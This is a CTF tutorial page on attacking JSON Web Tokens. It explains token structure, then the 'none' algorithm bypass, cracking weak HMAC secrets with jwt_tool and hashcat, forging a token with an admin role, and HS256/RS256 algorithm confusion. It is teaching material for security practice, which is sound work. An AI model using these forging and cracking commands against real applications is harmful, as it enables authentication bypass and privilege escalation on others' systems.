---
title: "JSON Web Tokens (JWT)"
description: "Learn how to analyze, decode, and exploit vulnerable JSON Web Tokens used in authentication mechanisms during CTF challenges."
date: 2025-10-06
draft: false
categories: ["Web"]
tags: ["jwt", "json web token", "authentication", "web exploitation", "ctf"]
authors: ["CTF.Support Team"]
summary: "Understand JWT structure and weaknesses like 'none' algorithm or weak HMAC secrets to recover or forge valid tokens in CTF web challenges."
aliases: ["/web/jwt/"]
slug: "jwt"
toc: true
---

## Introduction

**JSON Web Tokens (JWT)** are compact, self‑contained authentication tokens used by web applications.  
A typical token contains three Base64‑encoded parts:

```text
header.payload.signature
```

In CTFs, JWTs are frequently used for authentication puzzles where misconfiguration or weak signing keys allow you to forge or modify claims to become another user — often to escalate privileges or reveal a flag.

---

## Quick Reference

| Task                    | Command                                  |
|-------------------------|------------------------------------------|
| Decode token manually   | [https://jwt.io](https://jwt.io)         |
| Analyze & exploit token | `jwt_tool <token>`                       |
| Test “none” algorithm   | `jwt_tool -X a <token>`                  |
| Crack HMAC secret       | `jwt_tool --crack -d <wordlist> <token>` |

---

## Tools

| Tool                                                         | Purpose                                         |
|--------------------------------------------------------------|-------------------------------------------------|
| [jwt_tool](https://github.com/ticarpi/jwt_tool)              | Comprehensive JWT analysis/exploitation utility |
| [jwt.io](https://jwt.io)                                     | Web interface for decoding & verifying tokens   |
| [Hashcat](https://hashcat.net/hashcat/)                      | Brute‑force weak HMAC secrets (mode 16500: JWT) |
| [jwt‑cracker](https://github.com/brendan-rius/c-jwt-cracker) | C‑based dictionary cracker for HMAC tokens      |
| [CyberChef](https://gchq.github.io/CyberChef/)               | Convenient for Base64decode + inspection        |

---

## Structure

| Part          | Description                                                 |
|---------------|-------------------------------------------------------------|
| **Header**    | Algorithm & token type (e.g. `{"alg":"HS256","typ":"JWT"}`) |
| **Payload**   | User data & claims (`{"user":"guest","role":"user"}`)       |
| **Signature** | Verifies integrity (HMAC / RSA)                             |

Example token:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJ1c2VyIn0.gTZhw7xI25pUySAGfbt4h6blRC3UV1RS3u9bxTxg6z0
```

---

## Exploitation Techniques

### None Algorithm Vulnerability

If the server accepts `alg":"none"` without verifying a signature:

```bash
jwt_tool -X a <token>
```

This strips the signature and adjusts the header.

### Weak HMAC Secrets

If the algorithm is **HS256** (shared secret) and the key is weak, try cracking:

```bash
jwt_tool --crack -d rockyou.txt <token>
```

Or use Hashcat:

```bash
hashcat -m 16500 token.txt rockyou.txt
```

Once the key is discovered, sign a new token with elevated claims:

```bash
jwt_tool -S -p <secret> -I -pc "role" -pv "admin" <token>
```

### Algorithm Confusion (HS256 <> RS256)

If the server uses Asymmetric RSA but incorrectly trusts tokens signed via Symmetric HS256, replace the algorithm value and use the server’s public key as the secret to craft a valid HMAC.
